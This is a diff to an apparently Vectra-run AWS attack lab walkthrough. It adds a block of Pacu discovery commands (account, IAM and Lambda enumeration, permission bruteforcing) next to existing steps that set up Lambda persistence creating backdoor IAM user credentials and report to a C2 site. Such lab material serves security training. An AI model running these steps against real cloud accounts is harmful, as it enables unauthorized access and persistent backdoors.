@@ -387,10 +387,16 @@ For this part of the attack we will use Pacu
 -  Start pacu from the shell session by running ``~/pacu/cli.py``
 -  Create new session in pacu named ``chris``
 -  Add the keys from your AWS profile using ``import_keys chris``
--  List the Lambda functions with ``run lambda__enum``
 
-.. figure:: ./images/LambdaEnum.png
-   :alt: LambdaEnum
+- Perform a basic disovery in pacu
+.. code:: console
+
+    run aws__enum_account
+    run iam__enum_permissions
+    run iam__enum_users_roles_policies_groups
+    run lambda__enum
+    run iam__bruteforce_permissions
+
 
 Create persistence with Lambda that creates a backdoor IAM user credentials.  This will require 2 inputs which you will need prior to proceeding
    - Role ARN from previous attack ``aws iam list-roles --profile chris | grep cg-debug-role-lambda``
@@ -410,6 +416,7 @@ Persistence has been set. Lets create a new user to test it (you don't need to l
 .. code:: console
     
     aws iam create-user --user-name <initials> --profile chris
+        
 
 Now let’s visit our C2 site https://commander.vectratme.com/ to verify.  You will need a logon provided by Vectra.
 
